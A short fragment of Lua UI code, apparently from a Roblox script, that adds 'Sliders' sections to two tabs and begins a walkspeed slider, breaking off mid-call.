		--sliders
		local MainTab3 = MainTab:AddSection({
			Name = "Sliders"
		})

		local Misctab5 = MiscTab:AddSection({
			Name = "Sliders"
		})

		local TargetWalkspeed
		MainTab:AddSlider({
